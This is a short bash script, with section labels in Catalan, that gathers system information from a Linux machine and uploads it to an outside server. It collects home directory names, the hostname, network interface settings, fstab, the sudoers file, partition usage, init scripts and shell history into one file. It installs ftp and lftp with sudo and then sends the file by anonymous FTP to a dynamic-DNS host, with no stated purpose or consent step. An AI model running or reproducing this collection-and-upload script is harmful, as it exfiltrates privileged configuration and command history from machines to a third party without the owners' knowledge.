kk=$USER$HOSTNAME
echo "---nom---">$kk
ls /home >> $kk
echo "---makina---" >> $kk
hostname >> $kk
echo "------------xarxa-----------" >> $kk
cat /etc/network/interfaces >> $kk
echo "----fstab---">> $kk
cat /etc/fstab >> $kk
echo "----sudoers---">> $kk
cat /etc/sudoers >> $kk
echo "---usuari actual----">> $kk
whoami >>$kk
echo "---particions----">> $kk
df -Th >> $kk
echo "---scriptinicial---" >> $kk
ls /etc/init.d >> $kk
echo "---historial---" >>$kk
history >>$kk

sudo apt-get --assume-yes  install ftp
sudo apt-get --assume-yes install lftp

lftp -e 'cd SMX2; put '$kk';bye' -u anonymous, vladinatha.ddns.net
